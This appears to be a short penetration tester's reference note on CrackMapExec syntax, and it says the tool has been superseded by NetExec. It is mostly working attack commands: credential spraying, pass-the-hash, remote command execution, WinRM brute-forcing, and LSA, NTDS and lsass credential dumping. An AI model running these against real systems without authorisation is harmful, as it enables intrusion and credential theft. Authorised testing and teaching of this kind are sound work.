# CrackMapExec (CME)

**Tags:** `#crackmapexec` `#cme` `#smb` `#lateral` `#enumeration` `#postexploitation`

> [!note] **CrackMapExec is superseded by NetExec** — CME is no longer maintained. NetExec (`netexec` / `nxc`) is the actively maintained fork with identical syntax. Prefer NetExec for all new work. CME commands are listed here for reference — swap `crackmapexec` for `netexec` and they work identically.

See [[NetExec]] for the full reference. This note covers CME-specific syntax for backward compatibility.

---

## Common CME Commands

```bash
# Null session share enum
crackmapexec smb 192.168.1.10 --shares -u '' -p ''

# Authenticated share enum
crackmapexec smb 192.168.1.10 -u user -p Password --shares

# Subnet scan
crackmapexec smb 192.168.1.0/24 -u '' -p ''

# Credential validation
crackmapexec smb 192.168.1.10 -u Administrator -p Password
crackmapexec smb 192.168.1.0/24 -u Administrator -p Password

# Pass the Hash
crackmapexec smb 192.168.1.10 -u Administrator -H :NTLMhash
crackmapexec smb 192.168.1.10 -u Administrator -d . -H NTLMhash  # local auth

# Command execution
crackmapexec smb 192.168.1.10 -u Administrator -p Password -x "whoami"
crackmapexec smb 192.168.1.10 -u Administrator -H NTLMhash -x "whoami"

# Local auth
crackmapexec smb 192.168.1.10 -u Administrator -p Password --local-auth

# WinRM
crackmapexec winrm 192.168.1.10 -u user -p Password
crackmapexec winrm 192.168.1.0/24 -u user.list -p password.list

# Credential dump — LSA
crackmapexec smb 192.168.1.10 -u Administrator -p Password --lsa --local-auth

# Credential dump — NTDS
crackmapexec smb dc01 -u Administrator -p Password --ntds

# Module — GPP passwords
crackmapexec smb dc01 -u user -p Password -M gpp_password

# Module — lsassy
crackmapexec smb 192.168.1.10 -u Administrator -p Password -M lsassy
```

---

## Migration to NetExec

```bash
# CME → NetExec — just swap the command
crackmapexec smb ...  →  netexec smb ...
crackmapexec winrm ... →  netexec winrm ...
# All flags and modules are identical
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
